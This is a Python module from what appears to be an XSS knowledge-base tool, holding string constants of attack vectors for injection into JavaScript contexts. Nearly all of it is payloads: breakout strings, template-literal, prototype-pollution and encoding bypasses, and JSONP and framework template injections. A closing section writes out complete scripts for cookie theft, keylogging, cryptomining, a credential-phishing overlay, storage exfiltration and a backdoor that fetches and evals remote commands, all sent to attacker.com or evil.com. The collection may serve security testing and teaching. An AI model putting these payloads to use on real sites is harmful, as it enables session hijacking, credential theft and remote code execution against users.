#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-25 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

JavaScript Context - Attack Vectors Module
Contains attack vector data split into parts
"""

ATTACK_VECTOR_PART1 = """DIRECT CODE INJECTION:

1. BASIC INJECTION:
   Server code:
   <script>
   var data = <?php echo $user_input ?>;
   </script>

   Payload:
   1; alert(document.cookie); var x = 1

   Result:
   <script>
   var data = 1; alert(document.cookie); var x = 1;
   </script>

2. VARIABLE ASSIGNMENT:
   <script>var userId = USER_INPUT;</script>

   Payloads:
   null; alert(1); var x=
   123; fetch('//evil.com?c='+document.cookie); var x=
   null}catch(e){alert(1)}try{var x=

3. FUNCTION ARGUMENTS:
   <script>doSomething(USER_INPUT);</script>

   Payloads:
   1); alert(1); doSomething(1
   null); fetch('//evil.com?c='+btoa(document.cookie)); doSomething(null
   1, alert(1), 1

4. OBJECT PROPERTIES:
   <script>var config = {value: USER_INPUT};</script>

   Payloads:
   1, exploit: alert(1), real: 1
   null}; alert(1); var config = {value: null
   1}};alert(1);var config = {value:1

ES6 TEMPLATE LITERAL EXPLOITATION:

5. TEMPLATE STRINGS:
   <script>var message = `Hello USER_INPUT`;</script>

   Payload:
   ${alert(1)}
   ${fetch('//evil.com?c='+document.cookie)}
   ${constructor.constructor('alert(1)')()}

   Result:
   <script>var message = `Hello ${alert(1)}`;</script>

6. TAGGED TEMPLATES:
   <script>sql`SELECT * FROM users WHERE id = ${USER_INPUT}`;</script>

   Payload:
   1}; alert(1); var x = ${1
   1} OR 1=1 --

7. NESTED TEMPLATES:
   <script>var x = `Outer ${`Inner ${USER_INPUT}`}`;</script>

   Payload:
   ${alert(1)}
   `+alert(1)+`

PROTOTYPE POLLUTION:

8. __PROTO__ INJECTION:
   <script>var config = {USER_KEY: USER_VALUE};</script>

   If USER_KEY can be controlled:
   __proto__: {polluted: true}
   constructor: {prototype: {polluted: true}}

   Leading to XSS via:
   Object.prototype.polluted = '<img src=x onerror=alert(1)>';

9. CONSTRUCTOR POLLUTION:
   <script>merge(defaultConfig, {USER_INPUT});</script>

   Payload:
   "constructor": {"prototype": {"isAdmin": true}}

ARRAY/OBJECT CONTEXT BREAKOUTS:

10. ARRAY INJECTION:
    <script>var items = [USER_INPUT];</script>

    Payloads:
    1]; alert(1); var items = [1
    null]; fetch('//evil.com'); var x = [null
    1, alert(1), 1

11. NESTED OBJECTS:
    <script>var data = {user: {name: USER_INPUT}};</script>

    Payloads:
    null}}, exploit: alert(1), nested: {name: null
    "test"}}; alert(1); var data = {user: {name: "test"

12. BREAKING OUT WITH PUNCTUATION:
    }, alert(1), {x:1
    }], alert(1), [{x:1
    })}, alert(1), {x:({

FUNCTION CONSTRUCTOR ABUSE:

13. eval() INJECTION:
    <script>eval('var x = ' + USER_INPUT);</script>

    Payload:
    1; alert(1); var y=1

    Direct execution - extremely dangerous

14. Function() CONSTRUCTOR:
    <script>var fn = new Function('return ' + USER_INPUT);</script>

    Payload:
    1; alert(1); return 1
    alert(1)

15. setTimeout/setInterval STRINGS:
    <script>setTimeout('doSomething(' + USER_INPUT + ')', 1000);</script>

    Payload:
    1); alert(1); doSomething(1

ASYNC/AWAIT AND PROMISES:

16. PROMISE CHAINS:
    <script>
    Promise.resolve(USER_INPUT).then(data => console.log(data));
    </script>

    Payload:
    null); alert(1); Promise.resolve(null

17. ASYNC FUNCTIONS:
    <script>
    async function process() {
        var result = USER_INPUT;
    }
    </script>

    Payload:
    await fetch('//evil.com?c='+document.cookie); var result = null

18. GENERATORS:
    <script>
    function* gen() {
        yield USER_INPUT;
    }
    </script>

    Payload:
    alert(1); yield null"""

ATTACK_VECTOR_PART2 = """ENCODING AND OBFUSCATION BYPASSES:

19. UNICODE ESCAPES:
    <script>var x = \\u0055SER_INPUT;</script>

    Payloads:
    \\u0061lert(1)
    \\u0065val(atob('YWxlcnQoMSk='))

    Bypass:
    var x = \\u0061lert; x(1);

20. HEX ESCAPES:
    Payload:
    \\x61lert(1)
    \\x65\\x76\\x61\\x6c('alert(1)')

21. OCTAL ESCAPES:
    Payload:
    \\141lert(1)

22. COMMENT TRICKS:
    Payload:
    /**/alert(1)/**/
    1/*comment*/;alert(1);/**/var x=1
    1;alert(1)//rest of line ignored
    1;alert(1)<!--HTML comment also works in JS
    1;alert(1)-->"""

ATTACK_VECTOR_PART3 = """JSONP EXPLOITATION:

23. CALLBACK MANIPULATION:
    Server: /api/data?callback=USER_INPUT
    Response: USER_INPUT({"data":"value"})

    Payloads:
    alert
    alert(1);foo
    alert(1)//
    eval
    Function('alert(1)')()//

    Result:
    <script src="/api/data?callback=alert"></script>
    Executes: alert({"data":"value"})

24. JSONP WITH VALIDATION BYPASS:
    If server validates [a-zA-Z0-9_]:

    Use existing functions:
    alert
    console.log
    eval

    With dots (if allowed):
    console.log
    document.write
    window.alert

FRAMEWORK-SPECIFIC ATTACKS:

25. ANGULAR (v1.x) TEMPLATE INJECTION IN SCRIPT:
    <script>
    var template = '{{USER_INPUT}}';
    </script>

    Payload:
    {{constructor.constructor('alert(1)')()}}
    {{$on.constructor('alert(1)')()}}

26. VUE SERVER-SIDE RENDERING:
    <script>
    var app = new Vue({
        data: {value: 'USER_INPUT'}
    });
    </script>

    If USER_INPUT reaches template:
    {{constructor.constructor('alert(1)')()}}

27. REACT SSR ESCAPING BYPASS:
    Normally React escapes, but in <script>:
    <script>
    window.__INITIAL_STATE__ = USER_INPUT;
    </script>

    If not properly serialized:
    </script><script>alert(1)</script><script>

ADVANCED EXPLOITATION TECHNIQUES:

28. SCRIPT GADGETS:
    Using existing page scripts for exploitation:

    If page has:
    <script>
    function loadModule(name) {
        var script = document.createElement('script');
        script.src = '/modules/' + name + '.js';
        document.body.appendChild(script);
    }
    </script>

    Inject:
    null; loadModule('../../evil.com/xss'); var x=null

29. BREAKING OUT OF FUNCTIONS:
    <script>
    function process() {
        var data = USER_INPUT;
        return data;
    }
    </script>

    Payloads:
    null; } alert(1); function process() { var data=null
    null}};alert(1);process=function(){return null

30. MODULE IMPORTS:
    <script type="module">
    import {func} from 'USER_INPUT';
    </script>

    Payload:
    data:text/javascript,alert(1)//

REAL-WORLD ATTACK SCENARIOS:

SESSION HIJACKING:
<script>
var userId = null;
fetch('//attacker.com/steal?c=' + btoa(document.cookie));
var x = null;
</script>

KEYLOGGER:
<script>
var data = null;
document.addEventListener('keypress', e => {
    fetch('//attacker.com/log?k=' + e.key);
});
var x = null;
</script>

CRYPTOCURRENCY MINING:
<script>
var config = null;
var script = document.createElement('script');
script.src = '//attacker.com/coinhive.min.js';
document.head.appendChild(script);
setTimeout(() => {
    new CoinHive.Anonymous('attacker-key').start();
}, 1000);
var x = null;
</script>

PHISHING PAGE INJECTION:
<script>
var user = null;
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999"><form action="//evil.com/phish" method="POST"><h2>Session Expired</h2><input name="user" placeholder="Username" required><input name="pass" type="password" placeholder="Password" required><button>Login</button></form></div>';
var x = null;
</script>

DATA EXFILTRATION:
<script>
var apiKey = null;
var sensitiveData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    location: window.location.href,
    referrer: document.referrer
};
fetch('//attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(sensitiveData)
});
var x = null;
</script>

PERSISTENT BACKDOOR:
<script>
var temp = null;
setInterval(() => {
    fetch('//attacker.com/cmd')
        .then(r => r.text())
        .then(cmd => eval(cmd));
}, 5000);
var x = null;
</script>"""

ATTACK_VECTOR = ATTACK_VECTOR_PART1 + "\n\n" + ATTACK_VECTOR_PART2 + "\n\n" + ATTACK_VECTOR_PART3
